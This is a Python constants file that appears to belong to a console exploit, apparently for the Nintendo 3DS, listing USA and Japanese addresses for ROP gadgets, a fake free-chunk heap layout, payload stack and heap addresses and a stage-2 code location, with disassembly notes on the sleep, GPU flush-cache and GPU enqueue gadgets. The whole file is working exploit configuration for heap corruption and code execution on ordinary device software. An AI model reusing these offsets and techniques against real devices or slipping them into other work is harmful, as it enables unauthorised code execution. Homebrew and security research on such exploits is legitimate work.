"""Python constants."""

STAGE2_SIZE = 0x300

"""
fake_free_chunk

2nd dword needs to be big enough, and it is
3rd, 4th dword are null so it looks like the list is empty
0x15D62F10:  0x15D62F48 ; no idea
0x15D62F14:  0x15D62F54 ; >= desired size
0x15D62F18:  0x00000000 ; prev
0x15D62F1C:  0x00000000 ; next
"""

"""
start/end1

we don't want the corrupted chunk to get added to the free
list when it's freed, so put fake size data in the header
so it doesn't get added.
"""

"""
sleep_gadget

.text:001B5A5C                 LDMFD           SP!, {R4-R6,LR}
.text:001B5A60                 B               sleep
"""

"""
gpu_flushcache_gadget

.text:002E2954                 STMFD           SP!, {R4-R6,LR}
.text:002E2958                 MOV             R4, R0 <- jump here
.text:002E295C                 LDR             R0, =dword_30CF2C
.text:002E2960                 MOV             R6, R1
.text:002E2964                 LDR             R5, [R0]
.text:002E2968                 BL              unknown_libname_289
.text:002E296C                 MOV             R3, R6
.text:002E2970                 MOV             R2, R4
.text:002E2974                 MOV             R1, R5
.text:002E2978                 LDMFD           SP!, {R4-R6,LR}
.text:002E297C                 B               sub_2E978C
"""

"""
gpu_enqueue_gadget

.text:002E96FC                 BL              gsp__GetInterruptReceiver
.text:002E9700                 ADD             R0, R0, #0x58
.text:002E9704                 ADD             R1, SP, #4
.text:002E9708                 BL              gsp__EnqueueGpuCommand
.text:002E970C                 ADD             SP, SP, #0x24
.text:002E9710                 LDMFD           SP!, {R4-R11,PC}
"""

constants = {
    "fake_free_chunk": {
        "usa": 0x15D62F10,
        "jpn": 0x15D62F10
        },
    "heapctx": {
        "usa": 0x0039B560,
        "jpn": 0x0039B520
        },
    "start": {
        "usa": 0x140018AF,
        "jpn": 0x140018AF
        },
    "end1": {
        "usa": 0x14001920,
        "jpn": 0x14001920
        },
    "sleep_gadget": {
        "usa": 0x001B5A5C,
        "jpn": 0x001B5A5C
        },
    "gpu_flushcache_gadget": {
        "usa": 0x002E2958,
        "jpn": 0x002E2830
        },
    "gpu_enqueue_gadget": {
        "usa": 0x002E96FC,
        "jpn": 0x002E95D4
        },
    "memcpy_gadget": {
        "usa": 0x0022DB1C,
        "jpn": 0x0022DB1C
        },
    "pop_r0_pc": {
        "usa": 0x002e6f80,
        "jpn": 0x002e6e58
        },
    "pop_r1_pc": {
        "usa": 0x0022B6C8,
        "jpn": 0x0022B6C8
        },
    "payload_stack_addr": {
        "usa": 0x15D630C8,
        "jpn": 0x15D630C8
        },
    "stage2_code_va": {
        "usa": 0x002F5D00,
        "jpn": 0x002F5D00
        },
    "pop_r2_thru_r6_pc": {
        "usa": 0x0021462C,
        "jpn": 0x0021462C
        },
    "payload_heap_addr": {
        "usa": 0x14200000,
        "jpn": 0x14200000
        }
}
